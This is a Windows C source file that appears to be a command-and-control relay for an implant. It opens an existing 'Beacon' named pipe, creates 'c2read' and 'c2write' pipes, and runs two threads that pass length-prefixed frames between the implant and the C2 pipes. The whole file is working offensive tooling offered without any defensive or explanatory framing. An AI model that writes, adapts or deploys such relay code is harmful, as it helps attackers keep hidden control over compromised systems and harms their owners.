#include <stdio.h>
#include <Windows.h>


typedef struct _PIPES
{
	HANDLE hC2;
	HANDLE hBeacon;
}PIPES, * PPIPES;

DWORD ReadFromBeacon(HANDLE hPipe, LPVOID lpBuffer, DWORD dwLenght) {

	DWORD dwSize = 0;
	DWORD dwRead = 0;
	DWORD dwTotal = 0;

	ReadFile(hPipe, &dwSize, 4, &dwRead, NULL);
	printf("[+]Read From Beacon Data Size: %d\n", dwSize);

	while (dwTotal < dwSize) {
		ReadFile(hPipe, (PCHAR)lpBuffer + dwTotal, dwSize - dwTotal, &dwRead,
			NULL);
		dwTotal += dwRead;
	}
	return dwSize;
}

DWORD ReadFromC2(HANDLE hPipe, LPVOID lpBuffer) {
	DWORD dwSize = 0;
	DWORD dwRead = 0;
	ReadFile(hPipe, &dwSize, 4, NULL, NULL);
	printf("[+]Read From C2 Size\n");
	ReadFile(hPipe, lpBuffer, dwSize, &dwRead, NULL);
	printf("[+]Read From C2: %d\n", dwRead);
	return dwRead;
}

VOID WriteToC2(HANDLE hPipe, LPVOID lpBuffer, DWORD dwLength) {
	DWORD dwWrite = 0;
	WriteFile(hPipe, lpBuffer, dwLength, &dwWrite, NULL);

}

VOID WriteToBeacon(HANDLE hPipe, LPVOID lpBuffer, DWORD dwLength) {
	printf("[+]Write To Beacon Data Length: %d\n", dwLength);
	DWORD dwWrite = 0;
	WriteFile(hPipe, (void*)&dwLength, 4, &dwWrite, NULL);
	printf("[+]Write Data Size.\n");
	WriteFile(hPipe, lpBuffer, dwLength, &dwWrite, NULL);
	printf("[+]Write Data %d .\n", dwWrite);
}


DWORD WINAPI ReadFromBeaconThread(LPVOID lpParam) {
	PIPES* pPipes = lpParam;
	HANDLE hC2 = pPipes->hC2;
	HANDLE hBeacon = pPipes->hBeacon;

	DWORD dwLength = 0;
	LPVOID lpBuffer = VirtualAlloc(0, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	while (TRUE)
	{
		if (ConnectNamedPipe(hC2, NULL))
		{
			dwLength = ReadFromBeacon(hBeacon, lpBuffer, 1024 * 1024);
			WriteToC2(hC2, &dwLength, 4);
			FlushFileBuffers(hC2);
			WriteToC2(hC2, lpBuffer, dwLength);
			FlushFileBuffers(hC2);
			DisconnectNamedPipe(hC2);
			dwLength = 0;
			ZeroMemory(lpBuffer, 1024 * 1024);

		}

	}

	return 0;
}

DWORD WINAPI WriteToBeaconThread(LPVOID lpParam) {
	PPIPES hPipes = lpParam;
	HANDLE hPipe = hPipes->hC2;
	HANDLE hBeacon = hPipes->hBeacon;

	DWORD dwLength = 0;
	LPVOID lpBuffer = VirtualAlloc(0, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	while (TRUE)
	{
		if (ConnectNamedPipe(hPipe, NULL))
		{
			dwLength = ReadFromC2(hPipe, lpBuffer);
			WriteToBeacon(hBeacon, lpBuffer, dwLength);
			DisconnectNamedPipe(hPipe);
			dwLength = 0;
			ZeroMemory(lpBuffer, 1024 * 1024);
		}

	}

	return 0;
}

int main() {

	HANDLE hPipeRead;
	HANDLE hPipeWrite;
	HANDLE hBeacon;
	HANDLE hWaits[2];
	PIPES hReadPipes;
	PIPES hWritePipes;

	hBeacon = CreateFileA("\\\\.\\pipe\\hello", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL);

	if (hBeacon == INVALID_HANDLE_VALUE)
	{
		printf("[-] Not Found Beacon Pipe\n");
		return 0;
	}

	hPipeRead = CreateNamedPipe("\\\\.\\pipe\\c2read", PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 1024 * 1024, 1024 * 1024, 0, NULL);
	hPipeWrite = CreateNamedPipe("\\\\.\\pipe\\c2write", PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 1024 * 1024, 1024 * 1024, 0, NULL);

	hReadPipes.hC2 = hPipeRead;
	hReadPipes.hBeacon = hBeacon;
	hWritePipes.hC2 = hPipeWrite;
	hWritePipes.hBeacon = hBeacon;

	hPipeWrite = CreateThread(NULL, 0, WriteToBeaconThread, (LPVOID)&hWritePipes, 0, NULL);
	hPipeRead = CreateThread(NULL, 0, ReadFromBeaconThread, (LPVOID)&hReadPipes, 0, NULL);

	hWaits[0] = hPipeRead;
	hWaits[1] = hPipeWrite;


	WaitForMultipleObjects(2, hWaits, TRUE, INFINITE);


	return 0;

}
